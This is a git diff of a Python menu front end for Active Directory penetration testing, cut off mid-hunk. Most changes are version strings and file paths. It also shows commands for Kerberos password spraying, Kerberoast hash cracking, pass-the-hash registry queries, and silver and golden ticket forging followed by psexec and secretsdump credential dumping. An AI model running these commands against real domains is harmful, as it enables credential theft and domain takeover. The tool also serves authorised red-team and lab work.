@@ -9,7 +9,7 @@
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Load any required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -33,7 +33,7 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Check running as root.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -45,7 +45,7 @@ if os.geteuid() != 0:
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Create local user-friendly variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -72,7 +72,7 @@ keypath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH TO IPACKET
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Obtain the local systems IP address.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -83,7 +83,7 @@ localIP, null = linecache.getline("localIP.tmp", 1).rstrip("\n").split("/")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Create functional subroutines to be called from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -102,6 +102,15 @@ def testTwo():
       print("[-] DOMAIN NAME has not been specified...")
       return 1
    return 0  
+   
+def testThree():
+   if USR[:2] == "''":
+      print("[-] USERNAME has not been specified...")
+      return 1
+   if SID[:5] == "EMPTY":
+      print("[-] User SID has not been specified...")
+      return 1
+   return 0
 
 def spacePadding(variable,value):
    variable = variable.rstrip("\n")
@@ -134,6 +143,11 @@ def command(variable):
  
 def prompt():
    selection = input("\nPress ENTER to continue...")
+   return
+   
+def resetTokens():
+   command("rm DATAFILES/tokens.txt")
+   command("touch DATAFILES/tokens.txt") 
    return
 
 def display():
@@ -421,7 +435,7 @@ def options():
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Display program banner and boot system.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -440,7 +454,7 @@ print("               BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -464,9 +478,9 @@ print("[+] Populating system variables...")
 
 if not os.path.exists("DATAFILES/usernames.txt"):			
    command("touch DATAFILES/usernames.txt")
-   print("[+] File usernames.txt created...")
+   print("[+] File DATAFILES/usernames.txt created...")
 else:
-   print("[-] File usernames.txt already exists...")
+   print("[-] File DATAFILES/usernames.txt already exists...")
    
 if not os.path.exists("DATAFILES/passwords.txt"):			
    command("touch DATAFILES/passwords.txt")
@@ -510,7 +524,7 @@ VALD = ["0"*COL5]*maximum						# USER TOKEN
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -584,7 +598,7 @@ if splashs == 1:
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
@@ -602,7 +616,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -773,7 +787,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -809,7 +823,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -864,7 +878,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the remote port ranges.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -883,7 +897,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the web address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -900,7 +914,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -923,7 +937,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -940,7 +954,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -957,7 +971,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -982,7 +996,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -999,7 +1013,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1016,7 +1030,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1035,7 +1049,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1065,7 +1079,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1081,7 +1095,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1096,7 +1110,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1121,7 +1135,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1146,7 +1160,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1166,7 +1180,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1181,7 +1195,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - nmap IP46 -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1197,7 +1211,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - getArch.py target IP
 # Details : 32/64 bit
 # Modified: N/A
@@ -1222,7 +1236,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1237,7 +1251,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1252,7 +1266,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1267,7 +1281,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1282,7 +1296,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1297,7 +1311,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1312,7 +1326,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1327,7 +1341,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1341,7 +1355,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1360,7 +1374,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1404,7 +1418,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1485,7 +1499,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1558,7 +1572,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
@@ -1566,15 +1580,19 @@ while True:
 
    if selection =='33':
       checkParams = testTwo()
-
-      if checkParams != 1:
-         command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
-      prompt()
       
+      if checkParams != 1:
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password authentication...\n")
+            command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName 'HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s'")                                   
+         else:
+            command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
+      prompt()
+            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1589,7 +1607,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1608,7 +1626,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: N/A
 # Status  : Streamlined
@@ -1654,7 +1672,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1695,7 +1713,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1724,7 +1742,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1747,7 +1765,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1766,7 +1784,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1818,8 +1836,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
-# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
+# Version : Al@N_3r@dL3y                                                             
+# Details : Menu option selected - kerbrute.py -domain DOMAIN -users DATAFILES/usernames.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
 # -------------------------------------------------------------------------------------
 
@@ -1829,7 +1847,7 @@ while True:
       
       if checkParams != 1:
          print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
+         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users DATAFILES/usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
 
          test1 = linecache.getline("password1.tmp", 1)
          if test1 != "":
@@ -1840,7 +1858,7 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
-            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile password2.tmp")
+            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users DATAFILES/usernames.txt -passwords DATAFILES/usernames.txt -outputfile password2.tmp")
          
             test2 = linecache.getline("password2.tmp", 1)
             if test2 != "":
@@ -1851,7 +1869,7 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all users against password list, please wait as this could take sometime...")            
-            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords passwords.txt -outputfile password3.tmp > log.tmp") 
+            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users DATAFILES/usernames.txt -passwords passwords.txt -outputfile password3.tmp > log.tmp") 
                   
             test3 = linecache.getline("password3.tmp", 1)
             if test3 != "":
@@ -1863,7 +1881,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1883,14 +1901,14 @@ while True:
             command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
             command("strings cracked1.txt")
          else:
-            print("[-] The file usernames.txt is empty...")
+            print("[-] The file DATAFILES/usernames.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
-# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
+# Version : Al@N_3r@dL3y                                                             
+# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile DATAFILES/usernames.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1924,7 +1942,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1948,7 +1966,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
@@ -1958,11 +1976,11 @@ while True:
       checkParams = testTwo()
       
       if USR[:2] == "''":
-         print("[*] Please enter a valid Username for enumeration...")
+         print("[*] Please enter a valid username for enumeration...")
          checkParams = 1
 
       if checkParams != 1:
-         print("[*] Attempting to generate ticket for user " + USR.rstrip(" ") + "...")
+         print("[*] Attempting to generate a ticket for user " + USR.rstrip(" ") + "...")
 
          if NTM[:1] != "":
             print("[+] Using current associated hash...")
@@ -1981,7 +1999,7 @@ while True:
                print("[-] Current associated hash is not valid...")
            
          if checkParams != 1:
-            count = len(open('hashes.txt').readlines())
+            count = len(open("DATAFILES/hashes.txt").readlines())
             
             if count > 0:
                print("[*] Please wait, bruteforcing using " + str(count) + " found hashes...")
@@ -2038,7 +2056,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2050,7 +2068,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
 # Details : Silver Ticket!! 
 # Modified: N/A
@@ -2058,19 +2076,24 @@ while True:
 
    if selection == '48':
       checkParams = testTwo()
+      
+      if checkParams == 0:
+         checkParams = testThree()
 
       if checkParams != 1:
-         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
-
+         print("[*] Trying to create silver TGT for user " + USR.rstrip(" ") + "...\n")
+         
          if (NTM[:1] != "") & (SID[:1] != ""):
-            command(keypath + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
-            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-         else:
-            print("[-] Hash or Domain-SID not found...")
+            print("[i] Using HASH value as password credential...")
+            command(keypath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
 
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
+            print("[+] Exporting silver TGT to memory...")
+            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+            print("[*] Attempting to run psexec command...")
             command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(keypath + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
+            print("[*] Attempting to run secretsdump command...")
+            command(keypath + "secretsdump.py -k -no-pass " + DOM.rstrip(" ") + "") # CAN ADD MORE OPTIONS
          else:
              print("[-] Silver TGT was not generated...")      
       prompt()
@@ -2078,7 +2101,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Details : Golden Ticket!!
 # Modified: N/A
@@ -2086,19 +2109,24 @@ while True:
 
    if selection == '49':
       checkParams = testTwo()
+      
+      if checkParams == 0:
+         checkParams = testThree()
 
       if checkParams != 1:
-         print("[*] Trying user " + USR.rstrip(" ") + "...\n")
+         print("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...\n")
 
          if (NTM[:1] != "") & (SID[:1] != ""):
-            command(keypath + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
-            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
-         else:
-            command("echo 'Hash or Domain-SID not found...'")
-
+            print("[i] Using HASH value as password credential...")
+            command(keypath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
